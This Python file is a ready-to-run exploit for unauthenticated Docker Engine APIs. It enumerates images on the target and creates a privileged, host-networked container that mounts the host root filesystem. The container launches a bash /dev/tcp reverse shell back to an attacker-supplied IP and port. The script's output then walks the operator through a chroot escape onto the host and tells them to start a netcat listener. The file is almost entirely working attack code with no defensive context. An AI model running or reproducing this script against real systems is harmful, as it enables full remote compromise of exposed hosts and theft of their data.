from __future__ import print_function
import requests
import json
import sys
import argparse
import time

def exploit_docker_api(target_ip, target_port, attacker_ip, attacker_port, mount_path="/"):
    """
    Exploit Docker API by creating container with host mount
    
    Args:
        target_ip (str): Target Docker API IP address
        target_port (str): Target Docker API port
        attacker_ip (str): Attacker IP for reverse shell
        attacker_port (str): Attacker port for reverse shell
        mount_path (str): Host path to mount (default: / for Linux, /mnt/host/c for WSL2/Windows)
    """
    
    base_url = f"http://{target_ip}:{target_port}"
    
    # Step 1 - Enumerate available images
    try:
        print(f"[*] Connecting to Docker API at {base_url}")
        response = requests.get(f"{base_url}/images/json", timeout=10)
        
        if response.status_code != 200:
            print(f"[-] Failed to access Docker API. Status code: {response.status_code}")
            return False
            
        images = response.json()
        
        if not images:
            print("[-] No images found")
            return False
            
        print(f"[+] Found {len(images)} image(s)")
        
        # Get the first available image
        image_name = None
        for img in images:
            repo_tags = img.get('RepoTags', [])
            if repo_tags and repo_tags[0] != '<none>:<none>':
                image_name = repo_tags[0]
                print(f"[+] Using image: {image_name}")
                break
        
        if not image_name:
            print("[-] No valid image found with tag")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {base_url}")
        return False
    except requests.exceptions.Timeout:
        print("[-] Connection timeout")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    # Step 2 - Create malicious container with host mount
    print(f"\n[*] Creating malicious container with host mount...")
    print(f"[*] Mount: {mount_path} -> /host_root")
    
    # Reverse shell command
    reverse_shell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    
    container_config = {
        "Image": image_name,
        "Cmd": ["/bin/bash", "-c", reverse_shell_cmd],
        "HostConfig": {
            "Binds": [f"{mount_path}:/host_root"],
            "Privileged": True,  # Optional: for more capabilities
            "NetworkMode": "host"  # Optional: use host network
        }
    }
    
    try:
        create_url = f"{base_url}/containers/create"
        print(f"[*] Creating container at {create_url}")
        
        create_response = requests.post(
            create_url, 
            json=container_config,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        if create_response.status_code not in [200, 201]:
            print(f"[-] Failed to create container. Status: {create_response.status_code}")
            print(f"[-] Response: {create_response.text}")
            return False
        
        container_data = create_response.json()
        container_id = container_data.get('Id')
        
        if not container_id:
            print("[-] No container ID in response")
            return False
        
        print(f"[+] Container created with ID: {container_id[:12]}...")
        
    except Exception as e:
        print(f"[-] Error creating container: {e}")
        return False
    
    # Step 3 - Start the container
    print(f"\n[*] Starting container...")
    
    try:
        start_url = f"{base_url}/containers/{container_id}/start"
        start_response = requests.post(start_url, timeout=10)
        
        if start_response.status_code in [200, 204]:
            print(f"[+] Container started successfully!")
            print(f"[+] Reverse shell should connect to {attacker_ip}:{attacker_port}")
            print(f"\n[*] To access host filesystem, use: cd /host_root")
            print(f"[*] For interactive shell with chroot escape:")
            print(f"    chroot /host_root /bin/bash")
            return True
        else:
            print(f"[-] Failed to start container. Status: {start_response.status_code}")
            print(f"[-] Response: {start_response.text}")
            return False
            
    except Exception as e:
        print(f"[-] Error starting container: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Docker API Unauthorized RCE Exploit - Host Escape",
        epilog="""
Examples:
  # Linux host
  python exp.py -t 192.168.65.7 -a 10.10.13.19 -p 60002
  
  # WSL2/Windows host
  python exp.py -t 192.168.65.7 -a 10.10.13.19 -p 60002 -m /mnt/host/c
        """
    )
    
    parser.add_argument("-t", "--target", required=True, 
                       help="Target Docker API IP address")
    parser.add_argument("-P", "--target-port", default="2375", 
                       help="Target Docker API port (default: 2375)")
    parser.add_argument("-a", "--attacker-ip", required=True, 
                       help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--attacker-port", required=True, 
                       help="Attacker port for reverse shell")
    parser.add_argument("-m", "--mount-path", default="/", 
                       help="Host path to mount (default: / for Linux, use /mnt/host/c for WSL2)")
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("Docker API Unauthorized RCE Exploit - Host Filesystem Access")
    print("=" * 70)
    print(f"\n[!] Make sure netcat listener is running:")
    print(f"    nc -nlvp {args.attacker_port}\n")
    
    success = exploit_docker_api(
        target_ip=args.target,
        target_port=args.target_port,
        attacker_ip=args.attacker_ip,
        attacker_port=args.attacker_port,
        mount_path=args.mount_path
    )
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] Once you get the shell:")
        print("    1. Check mount: ls /host_root")
        print("    2. Escape to host: chroot /host_root /bin/bash")
        print("    3. Or access host files directly from /host_root")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
